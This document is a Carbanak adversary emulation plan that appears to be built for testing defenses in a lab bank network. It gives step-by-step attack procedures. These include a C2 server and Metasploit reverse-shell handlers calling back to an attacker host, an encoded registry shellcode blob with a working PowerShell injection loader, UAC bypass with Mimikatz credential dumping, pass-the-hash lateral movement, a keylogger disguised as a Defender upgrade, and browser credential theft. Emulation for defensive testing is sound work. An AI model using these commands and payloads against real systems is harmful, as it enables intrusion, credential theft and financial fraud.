# Preface

For the purpose of this emulation plan, Carbanak operations have been separated into 2 scenarios (detections and protections), with steps and granular procedures contained within each. This division enables users to separately test detection and protection capabilities of their defenses. Within each scenario, operations have been broken into specific objectives, which are presented linearly.

While in Scenario 1 each objective enables subsequent objectives, Scenario 2 is designed such that each objective is run independently of any other. Specifically, this scenario is intended to be used in an environment that has protective/preventative defense measures enabled. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.

This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run. For ease of use, a script has been included to automatically make these substitutions, found [here](/Resources/placeholder_substitution).

---

# Scenario 2 Overview

* Emulation of Carbanak usage of tools such as Carbanak malware, Mimikatz, and PsExec.
* Scenario begins after delivery of a reverse shell payload distributed via spearphishing
* Targeted attack of a financial institution with the explicit goal of monetary theft
* Split into distinct steps that can be run independently of other steps
* Designed to assess protective/preventative defense measures

## Contents

* [Step 1 - Initial Access & Collection](#step-1-initial-access--collection)
* [Step 2 - Registry Shellcode and Discovery](#step-2---registry-shellcode-and-discovery)
* [Step 3 - Credential Dumping](#step-3---credential-dumping)
* [Step 4 - Lateral Movement](#step-4---lateral-movement)
* [Step 5 - Credential Access](#step-5---credential-access)
* [Acknowledgments](#acknowledgments)
* [Additional Plan Resources](#additional-plan-resources)

### Pre-requisites

Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 2 Infrastructure](/Emulation_Plan/Scenario_2/Infrastructure.md) documentation.

---

## Test 1: Initial Access with Embedded VBE in Word Document

The scenario begins with an initial breach, where a legitimate user opens a Word document and
 clicks on ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/)) an embedded OLE object, causing an encoded ([T1027](https://attack.mitre.org/techniques/T1027/)) Visual Basic script contained within the object to execute ([T1059.005](https://attack.mitre.org/techniques/T1059/005/)).
 
On execution, this script decodes ([T1140](https://attack.mitre.org/techniques/T1140/)) and writes two files to disk, `starter.vbs` and `TransBaseOdbcDriver.js`. The script then executes `starter.vbs`, which in turn executes `TransBaseOdbcDriver.js` ([T1059.007](https://attack.mitre.org/techniques/T1059/007/)). `TransBaseOdbcDriver.js` is a RAT that establishes encrypted ([T1563.002](https://attack.mitre.org/techniques/T1563/002/)) command and control with the attacker over HTTP/S (TCP 443) ([T1071.001](https://attack.mitre.org/techniques/T1071/001/)).

The attacker then executes several discovery scripts that are part of the RAT, which gather information such as device hostname, username, domain ([T1033](https://attack.mitre.org/techniques/T1033/)), CPU architecture ([T1082](https://attack.mitre.org/techniques/T1082/)), and currently running processes ([T1057](https://attack.mitre.org/techniques/T1057/)). These scripts obtain this information by making WMI queries ([T1047](https://attack.mitre.org/techniques/T1047/)) and querying ActiveX networking attributes.

Finally, the attacker uploads ([T1105](https://attack.mitre.org/techniques/T1105/)) and executes a PowerShell script ([T1086](https://attack.mitre.org/techniques/T1059/001/)), which takes a screenshot of the user's desktop ([T1113](https://attack.mitre.org/techniques/T1113/)) and writes the screenshot to disk. The attacker then downloads the resulting screenshot over the existing C2 channel ([T1041](https://attack.mitre.org/techniques/T1041/)).

This step consists of behaviors found in Steps 0, 1, and 2 of Scenario 1.

### Procedures

#### 1.A - Start C2 Server

On the `Attack Platform`:

1. Start a new `tmux` session
    
    `tmux`

2. Start the C2 Server
    ```
    cd carbanak/Resources/utilities/carbanak_c2server/c2server
    sudo ./c2server.elf -lhost 0.0.0.0:443 -ssl
    ```

#### 1.B - User Execution: Malicious File (using Microsoft Word) ([T1204.002](https://attack.mitre.org/techniques/T1204/002/))

If testing with Microsoft Word, perform the following. If not, perform [Step 1.B*](#1b---user-execution-malicious-file-without-using-microsoft-word) instead.

On the `Attack Platform`:

1. Open a new `tmux` terminal
    ```
    Ctrl+b c
    ```

2. Copy `1-list.rtf` to `<domain_admin>`'s Desktop on `hrmanager`.
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put carbanak/Resources/step1/1-list.rtf Users\\<domain_admin>.<domain>\\Desktop\\1-list.rtf"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On `hrmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
    ```

2. Double-click `1-list.rtf` located on `<domain_admin>`'s desktop

3. Decline any spurious prompts, including updating document with linked data

4. Double click the **text** that says "Double Click Here To Unlock"

5. When prompted to run a script, click 'open'

6. Click "ok" when the fake error message displays

You should receive a callback on the C2 server.

#### 1.B* - User Execution: Malicious File (without using Microsoft Word)

Perform the following on `hrmanager` if you're testing without Office licenses:

On the `Attack Platform`:

1. Open a new `tmux` terminal
    ```
    Ctrl+b c
    ```

2. Copy `drop_payloads.vbe` to `hrmanager`
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put carbanak/Resources/step1/drop-payloads.vbe Users\\<domain_admin>.<domain>\\Desktop\\drop-payloads.vbe"
    ```
   
    Provide `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On hrmanager:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
    ```

2. Open cmd.exe

3. Manually execute VB script
    ```
    [hrmanager CMD]> cscript.exe C:\Users\<domain_admin>.<domain>\Desktop\drop-payloads.vbe
    ```

3. Make sure you click the 'ok' on the error message box! If you don't, the payload won't execute!

#### 1.C - Local Discovery ([T1033](https://attack.mitre.org/techniques/T1033/), [T1082](https://attack.mitre.org/techniques/T1082/), [T1057](https://attack.mitre.org/techniques/T1057/))

On the `Attack Platform`:

1. Switch back to the Carbanak C2 server `tmux` window

2. Get system information
    ```
    (ATT&CK Evals)> enum-system
    ```
   
#### 1.D - Screen Capture ([T1113](https://attack.mitre.org/techniques/T1113/))

1. Upload screenshot script
    ```
    (ATT&CK Evals)> upload-file /home/<attacker>/carbanak/Resources/step2/take-screenshot.ps1 "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1"
    ```

2. Take Screenshot
    ```
    (ATT&CK Evals)> exec-cmd "powershell.exe C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.ps1"
    ```

3. Exfil screenshot file over existing C2 channel
    ```
    (ATT&CK Evals)> download-file "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\screenshot__.png" /tmp/screenshot__.png
    ```
   
4. Switch to the other `tmux` terminal
    ```
    Ctrl-b + n
    ```

5. Verify "screenshot__.png" download worked
    ```
    <attacker>@<attack_platform>>:~$ ls /tmp/
    ```
   
6. Exit `tmux` Window
    ```
    exit 
    ```
   
7. Kill current session from C2 server
    ```
    (ATT&CK Evals)> exec-cmd taskkill /F /IM wscript.exe
    ```
   
8. Exit C2 Server
    ```
    (ATT&CK Evals)> exit
    ```

9. Close `tmux` session
    ```
    tmux kill-session
    ```
   
10. Close `hrmanager` RDP session
   
### Cited Intelligence

- Carbanak has created DOCX and RTF files with malicious files embedded in the documents. The user will click on an image which drops a VBS and builds a JScript RAT<sup>[13](https://www.forcepoint.com/blog/x-labs/carbanak-group-uses-google-malware-command-and-control)</sup>

---

## Test 2: Registry Shellcode and Execution

The attacker prepares and deploys a second stage RAT on the victim. First, they write obfuscated ([T1027](https://attack.mitre.org/techniques/T1027/)) shellcode to the Windows Registry using `reg.exe` ([T1112](https://attack.mitre.org/techniques/T1112/)).

The attacker then executes a PowerShell blob ([T1059.001](https://attack.mitre.org/techniques/T1059/001/)) that reads the shellcode from the registry ([T1012](https://attack.mitre.org/techniques/T1012/)), decodes and decrypts it ([T1140](https://attack.mitre.org/techniques/T1140/)), and then finally injects the shellcode into the current PowerShell process, executing it via a call to CreateThread ([T1055](https://attack.mitre.org/techniques/T1055/)). After execution, the attacker receives a callback over TCP port 8080 ([T1571](https://attack.mitre.org/techniques/T1571/)).

With this new 2<sup>nd</sup> stage RAT, the attacker examines local files in `<domain_admin>`'s home directory ([T1083](https://attack.mitre.org/techniques/T1083/)). The attacker then calls the `Get-NetComputer` function from the PowerView library, which queries Active Directory objects to return a list of hostnames in the current domain ([T1018](https://attack.mitre.org/techniques/T1018/)). The attacker then executes `Find-LocalAdminAccess`, also from PowerView, to confirm that the attacker has administrator access on the current workstation ([T1069](https://attack.mitre.org/techniques/T1069/)).

This step consists of behaviors found in Steps 3 and 4 of Scenario 1.

### Procedures

#### 2.A - Start C2 Handler

On the `Attack Platform`:

1. Start Metasploit
    ```
    sudo msfconsole
    ```
   
2. Set up TCP listener for Meterpreter on TCP port 8080
    ```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```

#### 2.B - Stage 2<sup>nd</sup> stage RAT ([T1112](https://attack.mitre.org/techniques/T1112/))

On `hrmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
    ```

2. Open Administrative PowerShell

3. Write shellode to Registry

    Note that the shellcode is: 
    - encrypted: XOR with key 'xyz'
    - compressed: Gzip
    - encoded: base64
    - designed to connect back to 192.168.0.4
    
    ```
    REG ADD "HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer" /v "{018247B2CAC14652E}" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA
    ```
   
#### 2.C - Execute 2<sup>nd</sup> stage RAT ([T1012](https://attack.mitre.org/techniques/T1012/), [T1055](https://attack.mitre.org/techniques/T1055/))

1. In the PowerShell window, copy, paste, and run the following PowerShell Blob to execute the Registry shellcode:
    ```
    $Signature = @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    "@
    $WinObj = Add-Type -memberDefinition $Signature -Name "Win32" -namespace Win32Functions -passthru
    $key = [System.Text.Encoding]::UTF8.GetBytes("xyz")
    $Payload = (Get-ItemProperty -Path HKCU:\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer).'{018247B2CAC14652E}'
    $bytes = [System.Convert]::FromBase64String($Payload)
    $in = New-Object System.IO.MemoryStream( , $bytes )
    $output = New-Object System.IO.MemoryStream
    $sr = New-Object System.IO.Compression.GzipStream $in, ([IO.Compression.CompressionMode]::Decompress)
    $sr.CopyTo($output)
    $sr.Close()
    $in.Close()
    [byte[]] $byteOutArray = $output.ToArray()
    [byte[]]$decrypted = @()
    for ($i = 0; $i -lt $byteOutArray.Length; $i++) {
        $decrypted += $byteOutArray[$i] -bxor $key[$i % $key.Length]
    }
    $WinMem = $WinObj::VirtualAlloc(0,[Math]::Max($decrypted.Length,0x1000),0x3000,0x40)
    [System.Runtime.InteropServices.Marshal]::Copy($decrypted,0,$WinMem,$decrypted.Length)
    $WinObj::CreateThread(0,0,$WinMem,0,0,0)
    ```

On the `Attack Platform`:
   
1. Interact with new Meterpreter session
    ```
    msf > sessions -i 1
    ```

2. Check Meterpreter session status
    ```
    meterpreter > getpid
    ```
   
#### 2.D - Local and Domain Discovery ([T1083](https://attack.mitre.org/techniques/T1083/), [T1018](https://attack.mitre.org/techniques/T1018/), [T1069](https://attack.mitre.org/techniques/T1069/))

1. Look for files in user home directory
    ```
    meterpreter > ls C:\\Users\\<domain_admin>.<domain>\\
    ```

2. Load PowerShell into memory
    ```
    meterpreter > load powershell
    ```
   
3. Import `PowerView` into memory
    ```
    meterpreter > powershell_import /home/<attacker>/carbanak/Resources/step6/powerview.ps1
    ```

4. Execute `PowerView`'s `Get-NetComputer` from memory
    ```
    meterpreter > powershell_execute Get-NetComputer
    ```

5. Execute `PowerView`'s `Find-LocalAdminAccess` from memory and write its output to a file on disk
    ```
    meterpreter > powershell_execute "Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt"
    ```
   
    You will likely see an error:

    `Error running command powershell_execute: Rex::TimeoutError Operation timed out.`

    That's okay - don't freak out!

    Meterpreter thinks the script timed out, but it is still running in the background.

    Wait `60` seconds to allow the script to finish.

6. Read the contents of the output file
    ```
    meterpreter > cat C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt
    ```
   
7. Exit the Meterpreter session
    ```
    meterpreter > exit
    ```

8. Exit Metasploit
    ```
    msf > exit
    ```
   
9. Close `hrmanager` RDP session
    
### Cited Intelligence
- Carbanak is known to rely on Powershell to execute custom scripts and download 2nd stage RATs.<sup>[4](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/),[6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf)</sup>
- Carbanak will employ multiple methods of obfuscation to conceal their activities.<sup>[1](https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf)</sup>
---

## Test 3: UAC Bypass and Credential Dumping

The attacker uploads two files ([T1105](https://attack.mitre.org/techniques/T1105/)) to perform credential dumping: **rad353F7.ps1** (UAC bypass) and **smrs.exe** (customized Mimikatz, called ATTACKKatz in this repository). The attacker executes **rad353F7.ps1** via PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/)), which in turn executes **smrs.exe** in high integrity ([T1549.002](https://attack.mitre.org/techniques/T1548/002/)). **smrs.exe** dumps plaintext credentials for the current user ([T1003.001](https://attack.mitre.org/techniques/T1003/001/)).

**FAQ About ATTACKkatz.exe**

attackkatz (smrs.exe in step 4.B) leverages the [Logonpasswords](https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords) functionality of Mimikatz to obtain passwords. This dumps LSASS memory to obtain credentials for users on the domain that have logged in to this machine ([T1003.001](https://attack.mitre.org/techniques/T1003/001/)).

This step consists of behaviors found in Step 4 of Scenario 1.

### Procedures

#### 3.A - UAC Bypass and Credential Dumping ([T1549.002](https://attack.mitre.org/techniques/T1548/002/), [T1003.001](https://attack.mitre.org/techniques/T1003/001/))

On `hrmanager`:

1. Login to victim workstation as `<domain_admin>`
    ```
    xfreerdp +clipboard /u:"<domain_admin>@<domain_full>" /p:"<domain_admin_password>" /v:<hrmanager_ip>
    ```

2. Confirm that the following path is present via file explorer:

    ```
    C:\Users\<domain_admin>.<domain>\AppData\Roaming\TransbaseOdbcDriver\
    ```
    
    If not, create it with CMD:
    
    ```
    mkdir C:\Users\<domain_admin>.<domain>\AppData\Roaming\TransbaseOdbcDriver\
    ```

On the `Attack Platform`:

1. Upload UAC Bypass script to `hrmanager`
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put /home/<attacker>/carbanak/Resources/step4/uac-bypass.ps1 Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\rad353F7.ps1"
    ```

    Use `<domain_admin>`'s password when prompted.
    
    `<domain_admin_password>`

2. Upload Mimikatz (custom) to `hrmanager`

    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<hrmanager_ip>/C$ -c "put /home/<attacker>/carbanak/Resources/step4/attackkatz.exe Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\smrs.exe"
    ```

Back on `hrmanager`:

1. Execute the UAC Bypass script from a PowerShell window:
    ```
    cd C:\Users\<domain_admin>.<domain>\AppData\Roaming\TransbaseOdbcDriver\
    .\rad353F7.ps1
    ```

2. Read Mimikatz output
    ```
    Get-Content "C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\MGsCOxPSNK.txt"
    ```

3. Close all windows on `hrmanager` and close the RDP session

### Cited Intelligence
- The Carbank malware contains a UAC bypass. <sup>[16](https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-two-continuing-source-code-analysis.html)</sup>
- Carbanak is known to use Mimikatz to facilitate privilege escalation.<sup>[6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf),[8](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/)</sup>
---

## Test 4: Lateral Movement via Pass-the-Hash

The attacker uses **PsExec.py**, providing a password hash for authentication ([T1550](https://attack.mitre.org/techniques/T1550/002/)), to gain a shell on the DC from `bankfileserver` ([T1569.002](https://attack.mitre.org/techniques/T1569/002/), [T1021.002](https://attack.mitre.org/techniques/T1021/002/)). They then upload and execute a second stage payload, **Tiny.exe**, over this SMB channel to receive a more powerful shell.

This step consists of behaviors found in Step 5 of Scenario 1.

#### 4.A - Lateral Movement via PsExec + Pass-the-Hash ([T1569.002](https://attack.mitre.org/techniques/T1569/002/), [T1550](https://attack.mitre.org/techniques/T1550/002/))

On the `Attack Platform`:

1. Start `tmux` if it is not already started

    `tmux`
    
2. Start Metasploit
    ```
    sudo msfconsole
    ```
   
3. Set up TCP listener for Meterpreter on TCP port 8080
    ```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```
    
4. Open a new `tmux` terminal
    ```
    Ctrl+b c
    ```

5. Copy needed files to the local staging folder (`/tmp/`)
    ```
    cp ~/carbanak/Resources/step5/impacket_exe /tmp/runtime
    cp ~/carbanak/Resources/step5/psexec.py /tmp/
    cp ~/carbanak/Resources/step5/tiny.exe /tmp/
    cd /tmp/
    ```
   
6. SCP those files to `bankfileserver`
    ```
    scp runtime psexec.py tiny.exe <domain_admin>@<bankfileserver_ip>:/tmp/
    ```
   
    Enter `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`
   
7. SSH into `bankfileserver` as `<domain_admin>`
    ```
    ssh <domain_admin>@<bankfileserver_ip>
    ```
   
    Enter `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`


8. Change to the `tmp` directory on `bankfileserver`
    ```
    <domain_admin>@bankfileserver:~$ cd /tmp/
    ```

9. Modify permissions on `runtime` to make it world-executable
    ```
    <domain_admin>@bankfileserver:~$ chmod 755 /tmp/runtime
    ```

10. Use `runtime` to execute `psexec.py` with the `<domain_admin>`'s password hash to connect to `bankdc`
    ```
    ./runtime psexec.py <domain_full>/<domain_admin>@<bankdc_ip> -hashes <domain_admin_password_ntlm_hash>
    ```
    
    You should have a shell on the domain controller now.

#### 4.B - Lateral Tool Transfer and Execution ([T1570](https://attack.mitre.org/techniques/T1570/))

1. Serve TinyMet over SMB

    From pass-the-hash shell:
    ```
    [bankdc CMD]> put tiny.exe
    ```

2. Execute TinyMet
    ```
    [bankdc CMD]> start /b C:\Windows\tiny.exe 192.168.0.4 8080
    ```

3. Switch back to the Metasploit `tmux` terminal 
    ```
    Ctrl+b n
    ```

4. Interact with the new **Tiny.exe** Meterpreter session
    ```
    sessions -i 1
    ```

5. Verify the session works
    ```
    meterpreter > getpid
    ```    

6. Close Meterpreter 
    ```
    meterpreter > exit
    ```

7. Exit Metasploit
    ```
    msf > exit
    ```

8. Switch to `psexec` shell
    ```
    Ctrl+b n
    ```

9. Exit psexec shell
    ```
    [bankdc CMD]> exit
    ```
   
10. Exit `bankfileserver` SSH session
    ```
    <domain_admin>@bankfileserver:~$ exit
    ```
    
11. Exit `tmux` session
    ```
    tmux kill-session
    ```

### Cited Intelligence
- Carbanak is known to use psexec, or other variations, to perform lateral movement and execute remote commands.<sup>[6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf)</sup>
- Carbanak is known to use TinyMet as a stager to execute Meterpreter as a stage 1 RAT.<sup>[3](https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/)</sup>
---

## Test 5: Credential Access

The attacker collects information needed to wire money to illicit accounts. The attacker performs keylogging ([T1056.001](https://attack.mitre.org/techniques/T1056/001/)) to monitor the CFO user's behavior, after which they steal the user's credentials from their web browser ([T1555.003](https://attack.mitre.org/techniques/T1555/003/)).

This step consists of behaviors found in Step 9 of Scenario 1.

### Procedures

#### 5.A - User Monitoring - ([T1056.001](https://attack.mitre.org/techniques/T1056/001/))

On the `Attack Platform`:

1. Upload the keylogger to the `cfo` workstation
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<cfo_ip>/C$ -c "put /home/<attacker>/carbanak/Resources/step9/keylogger.exe Users\\<cfo_user>\\AppData\\Local\Temp\\DefenderUpgradeExec.exe"
    ```
   
    Enter `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On `cfo`:
   
1. Login to the `cfo` workstation as the `<cfo_user>`
    ```
    xfreerdp +clipboard /u:"<cfo_user>@<domain_full>" /p:"<cfo_user_password>" /v:<cfo_ip>
    ```

2. Open a PowerShell window
   
2. Execute the keylogger
    ```
    cd $env:TEMP
    start-process .\DefenderUpgradeExec.exe -WindowStyle Hidden
    ```
   
3. Mimic user behavior
    ```
    1. Open Edge, go to finance.yahoo.com

    2. Open Payment Transfer System
    
    3. Enter "ATT&CK EVALS" in the box that sayd "Widgets Inc"
    ```

4. Open `cmd.exe` and kill keylogger
    ```
    taskkill /F /IM DefenderUpgradeExec.exe
    exit
    ```
   
5. Switch to PowerShell window and view keylogger dump
    ```
    get-content klog2.txt
    ```
   
#### 5.B - Credentials from Web Browsers ([T1070.004](https://attack.mitre.org/techniques/T1070/004/))

On the `Attack Platform`:

1. Upload the Web Credential Dumper to the `cfo` workstation
    ```
    sudo smbclient -U '<domain_full>\<domain_admin>' //<cfo_ip>/C$ -c "put /home/<attacker>/carbanak/Resources/step9/dumpWebCreds.exe Users\\<cfo_user>\\AppData\\Local\\Temp\\infosMin48.exe"
    ```
   
    Enter `<domain_admin>`'s password when prompted:
    
    `<domain_admin_password>`

On the `cfo` workstation:
   
2. Run the Web Cred Dumper from PowerShell
    ```
    .\infosMin48.exe
    ```
   
3. Close PowerShell window

4. Close RDP session

### Cited Intelligence
- Carbanak is known to deploy software that can monitor a user's keystrokes.<sup>[6](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf)</sup>
- Carbanak has tools that are built for collecting credentials from browsers and applications.<sup>[11](https://www.rsa.com/en-us/blog/2017-11/the-carbanak-fin7-syndicate)</sup>
---


## Additional Plan Resources

- [Intelligence Summary](/Intelligence_Summary.md)
- [Operations Flow](/Operations_Flow.md)
- [Emulation Plan](/Emulation_Plan)
  - [Scenario 1 - Infrastructure](/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1 - Detections](/Emulation_Plan/Scenario_1)
  - [Scenario 2 - Infrastructure](/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2 - Protections](/Emulation_Plan/Scenario_2)
  - [YAML](/Emulation_Plan/yaml)
- [File Hashes](/hashes)
- [YARA Rules](/yara-rules)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/CHANGE_LOG.md)
